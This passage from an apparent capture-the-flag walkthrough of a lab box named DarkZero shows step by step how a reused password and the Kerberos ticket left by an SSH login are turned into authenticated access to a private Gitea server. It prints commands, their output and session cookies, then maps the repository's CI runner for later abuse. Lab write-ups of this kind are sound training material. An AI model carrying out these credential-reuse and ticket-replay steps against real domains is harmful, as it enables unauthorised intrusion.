Tickets sit in a **credential cache**, usually shortened to _ccache_. On Linux there are two common places it can be.

A **file**, typically `/tmp/krb5cc_<uid>`. This is the traditional approach and it's the attacker's favourite, because a file can be copied. If you find someone else's ccache file readable, you can steal their tickets outright.

Or the **kernel keyring**, a protected in-memory store. Harder to extract from, and it doesn't sit on disk where anyone can grab it. You'll see which one this box uses in a moment.

```bash
klist
```

Kerberos **list**. It prints what's in your current credential cache. That's it — no arguments, no target. It's asking "what authentication tickets do I currently hold?"

If you hold nothing, it says so and exits. If you hold a TGT, you have a domain credential you didn't have to work for.

```bash
which kinit klist kvno; ls -la /etc/krb5.conf
```

The second command is reconnaissance on your own toolbox.

`which` searches your PATH for a program and prints where it lives, or stays silent if it isn't installed. You're checking three tools from the MIT Kerberos client suite: **`kinit`** obtains a fresh TGT by supplying a password, **`klist`** lists what you have, and **`kvno`** requests a service ticket for a named service. You'll use `kvno` in the next step, so confirming it exists now saves a surprise later.

`ls -la /etc/krb5.conf` checks for the Kerberos client configuration file. **This file is what makes Kerberos work at all** — it names the realm, tells the client which host is the KDC, and sets encryption preferences. Without it the tools have no idea who to talk to. Its presence is proof the machine was deliberately configured as a Kerberos client rather than merely having the packages installed.

The `;` between them just means "run these one after the other" — unrelated commands sharing a line.


**Breakdown:**

|Component|Purpose|Simple Explanation|
|---|---|---|
|`klist`|List Kerberos tickets in the current credential cache|Show what authentication tickets I already hold|
|`which kinit klist kvno`|Locate Kerberos client binaries|Check the Kerberos tools are installed|
|`ls -la /etc/krb5.conf`|Inspect the Kerberos client configuration file|Confirm the host is configured for a realm|

**Result:**

```shell
josh@SRV01:~$ klist
Ticket cache: KEYRING:persistent:780601110:krb_ccache_wcwxLy4
Default principal: josh@DARKZERO.EXT

Valid starting       Expires              Service principal
07/30/2026 14:02:27  07/31/2026 00:02:27  krbtgt/DARKZERO.EXT@DARKZERO.EXT
        renew until 08/06/2026 14:02:27

josh@SRV01:~$ which kinit klist kvno; ls -la /etc/krb5.conf
/usr/bin/kinit
/usr/bin/klist
/usr/bin/kvno
-rw-r--r-- 1 root root 693 Jul 30 10:34 /etc/krb5.conf
josh@SRV01:~$ 
```

There it is. That's the single most valuable line of output.

```
Default principal: josh@DARKZERO.EXT
krbtgt/DARKZERO.EXT@DARKZERO.EXT
```

**You are holding a Ticket Granting Ticket for a domain user, and you did nothing to earn it.** Ten hours of validity, renewable for a week. As I said before you ran it — that's effectively josh's domain credential in your hands.

##### Reading the rest of the output

###### The realm is confirmed

`DARKZERO.EXT`, capitalised. Your DNS domain from `resolv.conf` was lowercase `darkzero.ext`; Kerberos realms are conventionally the uppercase form of the DNS domain, and they're **case-sensitive**. Get this wrong in a command and you'll get errors that look like the account doesn't exist. Lowercase for DNS names, uppercase for realms.

###### Your ticket has plenty of runway

```
Valid starting       Expires
07/30/2026 17:22:47  07/31/2026 03:22:47
        renew until 08/06/2026 17:22:47
```

Issued at 17:22, expires at 03:22 tomorrow — the standard ten-hour lifetime. **Check that against the clock whenever you come back to a box after a break**, because an expired TGT produces failures that look like permission problems rather than time problems. If yours does expire, `kinit josh` and the password gets you a fresh one.

The `renew until` line is a separate mechanism worth knowing. A renewable ticket can be extended — `kinit -R` — **without re-supplying the password**, any time within that seven-day window. So in practice this credential is good for a week, not ten hours.

Also, quietly reassuring: remember `curl -I` reported the domain controller's clock as 17:11 GMT a few minutes before this. Your ticket timestamps are consistent with that. **The two machines agree on what time it is**, which means the five-minute skew tolerance isn't going to bite you. When Kerberos starts throwing incomprehensible errors later in a box, that's the first thing to check.

###### The cache is in the kernel, not a file

```
Ticket cache: KEYRING:persistent:780601110:krb_ccache_wcwxLy4
```

Remember I mentioned two possible storage locations. This is the **kernel keyring** — an in-memory store managed by the kernel — rather than a file in `/tmp`.

Two consequences.

**It's not stealable the easy way.** A file-based cache at `/tmp/krb5cc_1001` can be copied, moved to your Kali box, and used with Impacket tooling. A keyring cache can't be `cp`'d. Doesn't matter to you right now, because you're not trying to steal josh's ticket — you _are_ josh, and the local tools read the keyring transparently. But if you later need a portable copy for a tool that demands a file, you'd have to export it explicitly.

**And it's a documented divergence.** The reference material for this box records a file cache at `/tmp/krb5cc_1001`. Yours is a keyring. Same box, different instance, different backend — probably a configuration difference between builds. Worth flagging for a live walkthrough so you're not thrown if the audience has read a different writeup.

###### The toolbox is complete

```
/usr/bin/kinit
/usr/bin/klist
/usr/bin/kvno
-rw-r--r-- 1 root root 693 Jul 30 10:34 /etc/krb5.conf
```

All three tools present, and the configuration file exists. This machine is a fully configured Kerberos client, not one that merely has packages lying around.

`kvno` is the one you need next.

Note the permissions on the config file: `rw-r--r--` — root owns it, but **everyone can read it**. So josh can `cat /etc/krb5.conf` if he wants to see the realm definition and which host is designated as the KDC. Not necessary — you already know both — but it's the kind of file worth reading on a box where you _don't_ have the picture yet.

##### Why this is such a strong position

Worth spelling out what you now have, because it's more than "a ticket."

You're on a machine that is **already configured** for the domain. The Kerberos config is written, the KDC is reachable at layer 3 with no routing in the way, DNS resolves domain names correctly, and you hold a live TGT.

Contrast that with attacking a domain from Kali. You'd have to write your own `krb5.conf`, add `/etc/hosts` entries, tunnel your traffic into the internal network, and convert credentials into a usable ticket format. Every one of those is a chance to get something subtly wrong.

**So the strategy for the rest of this phase is: operate from SRV01.** Not because you can't tunnel out — you could — but because everything you need is already here and working.

##### The remaining gap

You hold a TGT. That gets you service tickets. But a service ticket only exists if the service is **registered in the directory** with a Service Principal Name.

You know that Gitea calls itself `gitea.darkzero.ext`, so the SPN you'd want is `HTTP/gitea.darkzero.ext`. But you don't know whether anybody registered it. If Gitea is set up for ordinary username-and-password login, no SPN exists, your TGT is useless against it, and you'd need a different route entirely.

**One command answers that.**

<div align="center"> <br> <br> ※※※※※※※※※※※※※※※※※※※※※※※※ <br> <br> <br> </div>

### 3.14 Verify a service ticket for the Gitea web service

Two separate things have to be true before Kerberos authentication to Gitea is possible, and they can fail independently — so you test them separately rather than running one command and guessing which half broke.

You've been using `172.16.20.2`. Now you need `gitea.darkzero.ext` to actually mean something to this machine, because Kerberos is going to insist on the name.

Even with the name resolving, the domain controller has to have a registered principal for the web service on that host. No registration, no ticket.

**Command 1:**

```bash
getent hosts gitea.darkzero.ext
```

`getent` means "get entries" — it queries the system's name databases the same way any normal program would. `getent hosts <name>` asks: what address does this name map to?

**Command 2:**

```bash
kvno HTTP/gitea.darkzero.ext
```

`kvno` stands for **key version number**, and the printed number is almost beside the point. What matters is what the tool has to _do_ to get it: **request a service ticket from the KDC.**

So this single command performs the entire stage-two exchange I described earlier. It takes your TGT from the keyring, contacts the KDC on port 88, asks for a ticket to `HTTP/gitea.darkzero.ext`, and — if the KDC obliges — **drops that service ticket into your credential cache** alongside the TGT.

That's the real product. `kvno` is a diagnostic tool, but its side effect is acquiring the ticket you're about to use.

**Breakdown:**

|Component|Purpose|Simple Explanation|
|---|---|---|
|`getent hosts`|Resolve a hostname through the system's name-service switch|Ask the OS what address this name maps to|
|`kvno`|Request a service ticket and print its key version number|Ask the KDC for a ticket to this specific service|
|`HTTP/gitea.darkzero.ext`|The Service Principal Name for the web service on that host|The formal name Kerberos knows the website by|

**Result:**

```shell
josh@SRV01:~$ getent hosts gitea.darkzero.ext
172.16.20.2     gitea.darkzero.ext

josh@SRV01:~$ kvno HTTP/gitea.darkzero.ext
HTTP/gitea.darkzero.ext@DARKZERO.EXT: kvno = 3
```

Both outputs are green and Let me unpack what each one actually established.

##### The name resolves — and to the machine you expected

```
172.16.20.2     gitea.darkzero.ext
```

Two facts fall out of this.

**AD DNS is serving the record.** You didn't add anything to `/etc/hosts` — you couldn't, josh doesn't have write access. So this answer came from the domain's own nameserver at `172.16.20.2`, which you identified back in 3.10. The domain knows this host by this name. That's a meaningful precondition: names that Active Directory knows about are names that can have SPNs registered against them.

**And notice the address.** `gitea.darkzero.ext` resolves to `172.16.20.2` — the domain controller itself. This is the same finding you made in 3.11 when port 3000 answered, now confirmed from a second direction. The Git server and the domain controller are one machine, and it has two names depending on which role you're addressing.

Worth pausing on the mechanics of why this worked at all. Recall the `127.0.0.53` DNS stub from 3.9 and the `nameserver 172.16.20.2` line from 3.10. Those two pieces connected: `getent` asked the local stub, the stub forwarded to the domain controller, the DC answered from its AD-integrated DNS zone. **Every enumeration step so far has been feeding the next one**, and this is the moment the DNS findings pay off.

##### The ticket request succeeded

```
HTTP/gitea.darkzero.ext@DARKZERO.EXT: kvno = 3
```

This is the important line, and there are three separate conclusions in it.

###### The SPN exists, which tells you how Gitea is configured

The KDC found `HTTP/gitea.darkzero.ext` in the directory. Had it not existed, you'd have got `Server not found in Kerberos database`.

Now reason backwards from that. **SPNs don't appear by accident.** Somebody registered that principal deliberately, and there is exactly one reason to register an `HTTP/` SPN for a web application: **so that clients can authenticate to it with Kerberos tickets.** If Gitea were configured for ordinary username-and-password login, no SPN would exist, because none would be needed.

So the existence of the SPN is your evidence that Gitea has **SPNEGO** — Kerberos-over-HTTP — enabled. In Gitea's own terminology this is its **SSPI authentication source**. You haven't confirmed it by logging in yet, but you've established it's configured, and that's enough to justify trying.

###### You now physically hold a ticket to Gitea

This is the part people miss because `kvno` presents itself as a diagnostic.

To print that key version number, `kvno` had to complete the full stage-two exchange: present your TGT to the KDC, request the service ticket, receive it. And when it received it, **it cached it.** The ticket is sitting in your keyring right now, next to the TGT.

Which means the next step doesn't need to contact the domain controller at all. The credential is already in hand.

If you want to see it, `klist` again would now show two entries — the `krbtgt/...` TGT and a new `HTTP/gitea.darkzero.ext@DARKZERO.EXT` line. Optional, but it's a satisfying way to watch the cache grow, and during a live walkthrough it makes the abstract concrete for your audience.

###### The number itself means the service is maintained

`kvno = 3`. **Key version number** — a counter that increments every time the account's password changes.

Here's the reasoning behind it. A service ticket is encrypted with the service account's key, which is derived from its password. If that password changes, previously issued tickets can no longer be decrypted. So Kerberos versions the keys: every ticket carries a kvno, and the service keeps old keys around briefly so tickets issued just before a change still work.

Version 3 means the password has been changed at least twice since the account was created. Mildly interesting as a signal — it suggests an account that's been maintained over time rather than provisioned five minutes ago for a lab. Not actionable. Don't overthink it.

##### What you've actually achieved

Put the pieces in order, because this is a genuinely elegant chain and it's worth being able to narrate it:

You cracked a **web application** password out of a MySQL database. That password happened to work over **SSH**, because the user reused it. The SSH login was handled by domain authentication, which left you a **Kerberos TGT**. The TGT bought you a **service ticket** for a private Git server. And you never touched Gitea's login form.

**Zero Gitea credentials. Full authentication pending.** The only thing left is presenting the ticket over HTTP.
<div align="center"> <br> <br> ※※※※※※※※※※※※※※※※※※※※※※※※ <br> <br> <br> </div>

### 3.15 Authenticate to Gitea via HTTP Negotiate

Kerberos was designed years before the web mattered, so there had to be a way to carry tickets inside HTTP requests. That mechanism is **SPNEGO**, and the HTTP scheme it uses is called **Negotiate**.

The exchange is four steps, and it's worth knowing:

1. **Client asks for a protected page.** Nothing special about the request.
2. **Server refuses with `401 Unauthorized`** and includes the header `WWW-Authenticate: Negotiate`. That header is the server saying: _I want a Kerberos ticket, not a password._
3. **Client gets a service ticket** for the server's SPN from the KDC, base64-encodes it, and resends the request with `Authorization: Negotiate <big blob>`.
4. **Server decrypts the ticket** using its own service account key, reads the identity inside, and issues a session cookie.

This is exactly what makes corporate single sign-on work. A domain user opens an internal web app in their browser and is simply _logged in_ — no prompt, no password. What happened invisibly is that their browser did steps 3 and 4 using the ticket their workstation login had already obtained.

**And that's precisely the property you're abusing.** SPNEGO doesn't ask _how_ you came to hold a TGT. It only checks that the ticket decrypts. You hold josh's ticket, so you are josh.

One more thing specific to Gitea's SSPI source: **it cannot be used with a username and password at all.** There's no fallback. Knowing `Rangers1` gets you nowhere against this application without the domain infrastructure to convert it into a ticket.

**Commands:**

```bash
curl -s --negotiate -u : -c /tmp/gitea_cookies.txt \
  "http://gitea.darkzero.ext:3000/user/login?auth_with_sspi=1" \
  -o /dev/null -w "%{http_code}\n"
```

Flag by flag.

**`--negotiate`** switches on SPNEGO. Curl will now perform steps 3 and 4 of that exchange on your behalf, pulling the ticket from your credential cache.

**`-u :`** is the one that trips everyone. Normally `-u user:password` supplies credentials. Here it's **empty username, empty password**, and it is _mandatory_. Curl's logic is that authentication flags only engage when credentials have been supplied — so without `-u`, the `--negotiate` flag sits inert and does nothing. Passing a bare colon says: _credentials are supplied, they're empty, get them from the ticket cache instead._ Omit it and you'll get an anonymous request and a confusing result.

**`-c /tmp/gitea_cookies.txt`** is the cookie **jar**. `-c` means _create_ — write any cookies the server sends into this file. That's the whole point of the request: authentication produces a session cookie, and you need it saved so subsequent commands can reuse it. **Note the letter.** `-c` writes, `-b` reads. You'll use `-b` for every request after this one, and mixing them up is a common self-inflicted wound.

**`?auth_with_sspi=1`** is Gitea's own query parameter. Hitting `/user/login` normally serves the HTML login form; adding this asks Gitea to run the SSPI authentication path instead. You're telling it explicitly: don't show me a form, take my ticket.

**`-o /dev/null`** throws away the response body. You don't care about the HTML — you care about the status code and the cookies.

**`-w "%{http_code}\n"`** prints just the status code and a newline. `-w` is curl's write-out facility, which can report all sorts of metadata about a transfer; `%{http_code}` is the placeholder for the HTTP status.

The trailing backslashes are line continuations — they let one long command span several lines for readability. Paste the whole thing at once.

```bash
cat /tmp/gitea_cookies.txt
```

**Breakdown:**

|Component|Purpose|Simple Explanation|
|---|---|---|
|`curl -s`|Silent mode|Suppress progress output|
|`--negotiate`|Enable SPNEGO/GSSAPI authentication|Use Kerberos tickets instead of a password|
|`-u :`|Empty username and password|**Required** — tells curl to draw credentials from the ticket cache rather than prompt|
|`-c /tmp/gitea_cookies.txt`|Write received cookies to a jar file|Save the session for reuse|
|`?auth_with_sspi=1`|Gitea query parameter forcing SSPI authentication|Ask for ticket-based login instead of the password form|
|`-o /dev/null`|Discard the response body|Only the status and cookies matter|
|`-w "%{http_code}\n"`|Print the HTTP status code|Show the result in one line|

**Result:**

```shell
josh@SRV01:~$ curl -s --negotiate -u : -c /tmp/gitea_cookies.txt \
  "http://gitea.darkzero.ext:3000/user/login?auth_with_sspi=1" \
  -o /dev/null -w "%{http_code}\n"
303

josh@SRV01:~$ cat /tmp/gitea_cookies.txt
# Netscape HTTP Cookie File
#HttpOnly_gitea.darkzero.ext    FALSE   /       FALSE   1785413446      _csrf   H2bovDeXiiZiQoesymaDH6gNzvs6MTc4NTMyNzA0NjcwNTI0MzEwMA
#HttpOnly_gitea.darkzero.ext    FALSE   /       FALSE   0       lang    en-US
#HttpOnly_gitea.darkzero.ext    FALSE   /       FALSE   0       i_like_gitea    80ee670d68ef31d7
```

**303 and `i_like_gitea` — you're logged in.** No password was submitted at any point in that exchange.

##### Reading the status code

`303 See Other` is a redirect, and it's what Gitea returns after a successful login — "you're authenticated, now go to the dashboard." Curl printed the 303 rather than following it because you didn't pass `-L`, which is fine; we just wanted the status, not the destination.

##### Reading the cookie jar

| Field | Your value                      | Meaning                                            |
| ----- | ------------------------------- | -------------------------------------------------- |
| 1     | `#HttpOnly_gitea.darkzero.ext`  | Which host the cookie belongs to                   |
| 2     | `FALSE`                         | Don't send to subdomains                           |
| 3     | `/`                             | Valid for the whole site                           |
| 4     | `FALSE`                         | Not restricted to HTTPS                            |
| 5     | `1785521071` or `0`             | Expiry as a Unix timestamp; `0` means session-only |
| 6     | `_csrf`, `lang`, `i_like_gitea` | Cookie name                                        |
| 7     | the long string                 | Cookie value                                       |

**Remember that field 7 holds the value** — in a few steps you'll extract the CSRF token with `awk '{print $7}'`, and that's where the number comes from.

The `#HttpOnly_` prefix isn't a comment despite the `#`. It's how this format marks a cookie as **HttpOnly**, meaning browsers won't let JavaScript read it — a defence against cookie theft via cross-site scripting. Irrelevant to you, since you're driving this from a command line rather than a browser, but it's why the lines look oddly commented out.

###### The three cookies

**`i_like_gitea=ac4b96c32e4b4f96`** is the session cookie, and it's the prize. From here on, **that string is your identity.** Present it and Gitea treats the request as josh. Gitea's playful naming convention aside, this is a bog-standard session identifier: a random token the server maps to a logged-in user in its own memory.

Its expiry is `0`, meaning session-only — it lives as long as the server keeps the session alive rather than until a fixed date.

**`_csrf`** is an anti-forgery token, and you'll need it soon. Same mechanism you met on the campaign application: the server issues a random token and requires it echoed back on any request that _changes_ something. It exists so a malicious website can't make your browser silently submit a form to Gitea using your cookies. Reading data doesn't need it. Forking a repository, committing a file, opening a pull request — all of those will.

**`lang=en-US`** is a display preference. Ignore it.

##### What just happened, in one sentence you could say out loud

You presented a Kerberos ticket that a _different_ service handed you as a byproduct of an SSH login, and a private Git server on a domain controller accepted it as proof of identity.

That's four services deep from one cracked database hash — MySQL, SSH, the KDC, Gitea — and every hop was a legitimate feature working exactly as designed. **No exploit yet.** Everything so far has been enumeration and credential reuse. The actual vulnerability is still ahead of you.

<div align="center"> <br> <br> ※※※※※※※※※※※※※※※※※※※※※※※※ <br> <br> <br> </div>

### 3.16 Enumerate Gitea identity and accessible repositories

You have a session. Two things you don't know:

**Who does Gitea think you are?** You authenticated as `josh@DARKZERO.EXT` in Kerberos terms, but Gitea maintains its own user accounts. It had to map that domain identity onto something local, and you need to know what — including whether that account happens to have administrative privileges, which would shortcut everything.

**What can you see?** You know one repository exists somewhere, since the runner on SRV01 was built to check out code from somewhere. Whether josh can _see_ it is a different matter.

Answering identity first is the right order, because the answer frames everything after it. If josh turns out to be a Gitea admin, you stop looking for clever routes and just use the admin panel.

##### Talking to an API instead of a website

Both commands hit URLs starting `/api/v1/`, and this is a shift worth explaining properly since it's how you'll interact with Gitea for the rest of the phase.

A web application generally offers two front doors onto the same data. The **HTML interface** returns pages built for human eyes — markup, styling, navigation. The **API** returns the same underlying information as **JSON**: a plain, structured data format designed for programs.

Compare what you'd have to do. To learn your username from HTML, you'd fetch a page, wade through a few hundred lines of markup, and try to grep out the right bit — fragile, and it breaks the moment the theme changes. To learn it from the API, you fetch `/api/v1/user` and get a small object with a `login` field in it.

**For scripted enumeration, always look for the API.** Same authentication, same session cookie, dramatically less noise. Gitea's is well documented and mirrors GitHub's closely enough that experience transfers.

**Command 1 — who am I:**

```bash
curl -s --negotiate -u : -b /tmp/gitea_cookies.txt \
  "http://gitea.darkzero.ext:3000/api/v1/user" | python3 -m json.tool
```

**`-b` instead of `-c`.** This is the switch I flagged earlier: `-c` _created_ the jar and wrote cookies into it, `-b` **reads** the jar and sends those cookies with the request. That's what makes this request authenticated — you're presenting `i_like_gitea` and Gitea recognises the session.

`--negotiate -u :` is still there as a belt-and-braces measure. The cookie alone would probably suffice, but if the session were rejected, these let curl fall back to re-authenticating with the ticket rather than failing outright.

**`/api/v1/user`** is the "tell me about the currently authenticated account" endpoint. There's no username in that URL — it deliberately means _whoever is holding this session_. It's the API equivalent of `whoami`.

**`| python3 -m json.tool`** pretty-prints the response. JSON arrives from a server as one dense unbroken line, technically valid and painful to read. `json.tool` is a module built into Python that parses it and re-prints it indented, one field per line. It also acts as a free validity check: if the response weren't JSON — an HTML error page, say — this would throw a parse error and tell you something went wrong.

**Command 2 — what can I see:**

```bash
curl -s --negotiate -u : -b /tmp/gitea_cookies.txt \
  "http://gitea.darkzero.ext:3000/api/v1/repos/search?limit=50" \
  | python3 -c "import sys,json; [print(r['full_name'], '| private:', r['private']) for r in json.load(sys.stdin)['data']]"
```

**`/api/v1/repos/search?limit=50`** asks for every repository this session can see, capped at fifty results. With no search term it's a "list everything" query. The cap is there because APIs paginate by default — often at ten — and you'd rather not miss anything.

The Python at the end is doing filtering rather than formatting. `python3 -c "..."` runs a one-line program instead of a file. It reads the JSON from standard input, digs into the `data` key where Gitea puts the result array, and for each repository prints just two fields: `full_name` and `private`.


**Result:**

```shell
josh@SRV01:~$ curl -s --negotiate -u : -b /tmp/gitea_cookies.txt \
  "http://gitea.darkzero.ext:3000/api/v1/user" | python3 -m json.tool
{
    "id": 6,
    "login": "darkzero-ext_josh",
    "login_name": "",
    "source_id": 0,
    "full_name": "",
    "email": "ad8a459d-f75e-46b7-92b7-4213defd890d@localhost.localdomain",
    "avatar_url": "http://gitea.darkzero.ext:3000/avatars/5f3a440ab8b9ef02507361310493654d",
    "html_url": "http://gitea.darkzero.ext:3000/darkzero-ext_josh",
    "language": "en-US",
    "is_admin": false,
    "last_login": "1969-12-31T16:00:00-08:00",
    "created": "2026-05-20T13:44:57-07:00",
    "restricted": false,
    "active": true,
    "prohibit_login": false,
    "location": "",
    "website": "",
    "description": "",
    "visibility": "public",
    "followers_count": 0,
    "following_count": 0,
    "starred_repos_count": 0,
    "username": "darkzero-ext_josh"
}
```

```shell
josh@SRV01:~$ curl -s --negotiate -u : -b /tmp/gitea_cookies.txt \
  "http://gitea.darkzero.ext:3000/api/v1/repos/search?limit=50" \
  | python3 -c "import sys,json; [print(r['full_name'], '| private:', r['private']) for r in json.load(sys.stdin)['data']]"
DarkZero/DarkZero-Campaigns | private: True
```

Both match. And the username looks mangled exactly as I said it would.

##### The account was created for josh automatically

```
"login": "darkzero-ext_josh"
```

Gitea didn't have a user called josh before he showed up. When SSPI authentication succeeds for a domain identity Gitea hasn't seen, it **auto-provisions** an account on the spot, deriving the name from the domain identity with a mechanical rule: take the domain, replace dots with hyphens, append an underscore and the username.

So `josh@darkzero.ext` becomes `darkzero-ext_josh`.

The reason for the mangling is namespace collision. In a forest with several domains you could have `josh@darkzero.ext` and `josh@darkzero.htb` as entirely different people, so the domain has to be baked into the Gitea username to keep them apart. Dots get replaced because Gitea's usernames appear in URLs and dots cause parsing headaches.

**Practical consequence: from now on, `darkzero-ext_josh` is your identity in every Gitea URL and API call.** When we fork the repository in 3.19, the fork lands under that name. Get it wrong and you'll be querying an account that doesn't exist.

Two other fields confirm the auto-provisioning story:

```
"email": "ad8a459d-f75e-46b7-92b7-4213defd890d@localhost.localdomain"
"last_login": "1969-12-31T16:00:00-08:00"
```

That email is a **UUID placeholder** — a randomly generated unique identifier at a fake domain. Gitea requires an email per account, SSPI didn't supply one, so it invented something guaranteed not to collide. No human typed that.

And `last_login` is more interesting than it looks. `1969-12-31T16:00:00-08:00` is **the Unix epoch** — midnight on 1 January 1970 UTC, shown in a Pacific timezone eight hours behind. Epoch means _zero_, and zero means **this field has never been set**. The account has never completed an interactive login through the web form. Every access has been via ticket.

Which is a small but real point about detection: from Gitea's own audit perspective, this account has no login history. Ticket-based access left a thinner trail than a password login would have.

`"created": "2026-05-20"` puts provisioning one day after josh's application account in the campaign app's database. Same onboarding batch. Nothing actionable, but it's the kind of correlation that builds confidence you understand the environment.

##### The privileges are ordinary

```
"is_admin": false
"restricted": false
"active": true
"prohibit_login": false
```

`is_admin: false` closes the shortcut. No site administration, no user management, no access to other people's private repositories. You'll have to work.

##### One repository, and it's private

```
DarkZero/DarkZero-Campaigns | private: True
```

`DarkZero` is an **organization** — Gitea's container for shared repositories with team-based access, rather than a personal account. `DarkZero-Campaigns` is the source code of the web application you exploited back in section 3.1, now viewable from the inside.

**The `private: True` is the finding.** A public repo visible to josh would be visible to anyone. A private one visible to josh means somebody explicitly granted him access — he's a member of that organization or a team within it. So this isn't accidental exposure; it's intended access being used in an unintended way.


##### Where this leaves you

Read-only-ish access to one private repository, no admin rights, no other targets. On a normal Git server that would be a fairly boring position.

But recall two things you already know. From 3.9, there's a **runner agent on SRV01** owned by `svc-runner`, waiting for jobs. From 3.12, this Gitea is version **1.25, which ships Actions** — the system that dispatches those jobs.

**So the question is whether this repository is wired into that system.** If it is, then a Git server you can only read from is connected to a machine that executes code.

<div align="center"> <br> <br> ※※※※※※※※※※※※※※※※※※※※※※※※ <br> <br> <br> </div>

### 3.17 Enumerate repository permissions and workflow configuration

##### Two things to establish

**Exactly what can you do to this repository?** "Visible" is not a permission level. There's a real difference between reading, writing, and administering, and the boundary decides your whole approach.

**Are automated builds actually enabled here?** Gitea supporting Actions doesn't mean this repository uses them. It's a per-repository setting.

##### Understanding Gitea's permission model

Three levels, and they nest.

**`pull`** means read. You can browse the code, clone it, view history and open issues. The name comes from `git pull` — the operation that fetches code _down_.

**`push`** means write. You can commit changes directly into the repository. From `git push`, sending code _up_.

**`admin`** means control. Settings, collaborators, deletion.

**For your purposes the critical line is between `pull` and `push`**, and here's why. If you had `push`, this box would be over in one move: edit the workflow file, commit it, the build runs your code. Done.

Without `push`, you cannot alter what the repository contains — and since a build runs the instructions _stored inside_ the repository, you can't influence what gets executed. That's the wall. Everything from 3.19 onwards is a way around it.

**Command 1 — permissions and settings:**

```bash
curl -s --negotiate -u : -b /tmp/gitea_cookies.txt \
  "http://gitea.darkzero.ext:3000/api/v1/repos/DarkZero/DarkZero-Campaigns" \
  | python3 -c "import sys,json; d=json.load(sys.stdin); print('perms:', d.get('permissions')); print('default_branch:', d.get('default_branch')); print('has_actions:', d.get('has_actions'))"
```

The endpoint `/api/v1/repos/<owner>/<repo>` returns everything about one repository — and, usefully, **your own access rights to it as evaluated for this session**. You don't have to guess or test by trial and error; the API tells you.

The Python pulls three fields. Note `d.get('permissions')` rather than `d['permissions']`: **`.get()` returns nothing if the key is missing, whereas square brackets crash.** A small habit that matters when you're poking at APIs whose exact response shape you don't know yet.

The three fields:

- **`permissions`** — your `admin`/`push`/`pull` flags.
- **`default_branch`** — the main line of development. Matters because pull requests target it and workflow triggers are evaluated against it.
- **`has_actions`** — whether CI/CD is switched on for this repository. This is the one you're really here for.

**Command 2 — the workflow directory:**

```bash
curl -s --negotiate -u : -b /tmp/gitea_cookies.txt \
  "http://gitea.darkzero.ext:3000/api/v1/repos/DarkZero/DarkZero-Campaigns/contents/.gitea/workflows" \
  | python3 -m json.tool
```

The **contents** endpoint lists files at a path inside the repository — a directory listing over HTTP.

**Why that specific path?** Because CI systems find their configuration by convention, not configuration. GitHub Actions reads `.github/workflows/`. Gitea Actions reads **`.gitea/workflows/`**. Any YAML file dropped in that directory is picked up automatically as a build definition. So if this repository has automated builds, that is where they live, and you don't have to search for them.

The leading dot makes it a hidden directory by Unix convention, which is why a casual `ls` wouldn't show it.

**Breakdown:**

|Component|Purpose|Simple Explanation|
|---|---|---|
|`/api/v1/repos/<org>/<repo>`|Repository metadata endpoint|Details about the repo|
|`d.get('permissions')`|Extract the caller's access rights|What am I allowed to do here|
|`has_actions`|Whether CI/CD is enabled on this repository|Does this repo run build jobs|
|`/contents/.gitea/workflows`|Directory listing endpoint for the workflow folder|List the CI job definitions|

**Result:**

```shell
perms: {'admin': False, 'push': False, 'pull': True}
default_branch: main
has_actions: True
```

```json
[
    {
        "name": "main.yml",
        "path": ".gitea/workflows/main.yml",
        "sha": "2ce5d268ecd274e85d0379ce819956a59bab95b8",
        "last_commit_sha": "0d2c697eb31acef7ec81df70d33415cd0150b116",
        "last_committer_date": "2026-05-20T22:01:19+01:00",
        "type": "file",
        "size": 295,
        "content": null,
        "download_url": "http://gitea.darkzero.ext:3000/DarkZero/DarkZero-Campaigns/raw/branch/main/.gitea/workflows/main.yml"
    }
]
```

This step produced two facts that define the rest of the phase — one is a wall, the other is a door.

##### The wall

```
perms: {'admin': False, 'push': False, 'pull': True}
```

You can read. You cannot write.

A build executes instructions **stored inside the repository** — the workflow file, and the scripts the workflow calls. To change what gets executed, you must change the repository's contents. To change the contents, you need `push`. You don't have `push`.

So the obvious attack — edit `main.yml`, commit a line that runs your command, wait for the build — is closed. Not "harder", closed. Gitea will reject the commit.


##### The door

```
has_actions: True
```

Automated builds are switched on. Combine that with what you found in 3.9 — the runner agent on SRV01, owned by `svc-runner`, holding a port open waiting for work — and the two halves connect.

**There is a machine that executes code on behalf of this repository, and you already have a shell on that machine as a lesser user.**

##### The directory listing

One file: **`.gitea/workflows/main.yml`**, 295 bytes.

Small. 295 bytes is a dozen lines of YAML, not a sophisticated pipeline. Something minimal and probably unfinished — which is often true of the things that end up being exploitable.

##### Where you stand

Read-only on a private repository whose builds run on a machine you already occupy. The next question is the whole game: **what does that build do, and what makes it start?**

Because if the answer to "what makes it start" is something a read-only user can cause, then `push: False` stops being a wall.
<div align="center"> <br> <br> ※※※※※※※※※※※※※※※※※※※※※※※※ <br> <br> <br> </div>

### 3.18 Read the workflow definition

##### What a workflow file actually is

Before you read it, know what you're reading.

**Continuous integration** is the practice of automatically checking code every time it changes — install the dependencies, run the tests, build the artefact — so mistakes surface immediately instead of at release time. It's standard practice on essentially every modern software project.

A **workflow file** is the recipe for that process. It's YAML, a plain-text format designed to be human-readable, and it answers two questions:

**When should this run?** That's the `on:` key, listing the events that start a build. Someone pushed code. Someone opened a pull request. A timer fired.

**What should it do?** That's `jobs:` and `steps:` — the sequence of commands to execute, and on what kind of machine.

**For an attacker, `on:` is the more important half.** The steps tell you what code runs; the triggers tell you **who can make it run**. A pipeline that only fires on direct pushes to `main` is reachable by people with write access — not you. A pipeline that fires on events an outsider can generate is a very different proposition.

Two other things to look for, and I'd rather you know them before you see the file so you can spot them yourself.

**Where does it run?** CI jobs execute either on a **throwaway container** — created fresh, destroyed after, so a compromise gets you a sandbox that's about to be deleted — or on a **self-hosted runner**, a persistent agent on a real machine. Self-hosted means code execution gets you that machine: its filesystem, its network position, its credentials.

**What do the steps actually invoke?** Watch for commands whose behaviour is defined _inside the repository_ rather than in the workflow. `npm test` looks like a fixed instruction. It isn't. It runs whatever string sits under `"test"` in `package.json` — a file in the repository. Same for `npm run build`. And `npm ci` will execute `preinstall`, `install`, and `postinstall` hooks belonging to any dependency it fetches. **Three separate places where repository content becomes executed commands.**

**Command:**

```bash
curl -s --negotiate -u : -b /tmp/gitea_cookies.txt \
  "http://gitea.darkzero.ext:3000/DarkZero/DarkZero-Campaigns/raw/branch/main/.gitea/workflows/main.yml"
```

That's the `download_url` from the listing you just got.

Note it's **not** an `/api/v1/` path. The raw endpoint sits on the normal web interface, and the URL reads plainly: this repository, `raw` content, from `branch/main`, at this path. No JSON wrapper, no base64, no pretty-printer needed — the file's bytes land in your terminal.

